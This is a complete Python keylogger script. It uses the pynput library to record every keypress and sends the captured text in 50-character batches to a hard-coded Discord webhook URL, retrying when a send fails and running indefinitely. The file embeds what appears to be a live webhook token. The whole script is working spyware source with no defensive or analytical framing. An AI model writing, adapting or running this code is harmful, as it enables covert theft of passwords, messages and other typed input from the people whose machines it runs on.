from pynput import keyboard
import requests
from datetime import datetime
from tenacity import retry, stop_after_attempt, wait_fixed

# === CONFIG ===
webhook_url = "https://discord.com/api/webhooks/1410186890677719130/Gdx4zpzx4Q5N5tnT-9uZqzOtEoUQMr8vDknGUDB04H1kKUaf1JVXTL9CHxOriW7nPeXO"

log = ""

@retry(stop=stop_after_attempt(3), wait=wait_fixed(2))
def send_to_webhook(log_data):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    full_log = f"{timestamp} {log_data}"
    payload = {
        "content": f"**Keylog:**\n```{full_log}```"
    }
    response = requests.post(webhook_url, json=payload)
    response.raise_for_status()  # Raise exception for failed requests

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        else:
            pass

    if len(log) >= 50:
        try:
            send_to_webhook(log)
            log = ""
        except Exception as e:
            print(f"[!] Webhook failed: {e}")

print("[*] Keylogger started.")

# Start listener without on_release to prevent stopping
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.wait()  # Keep the script running indefinitely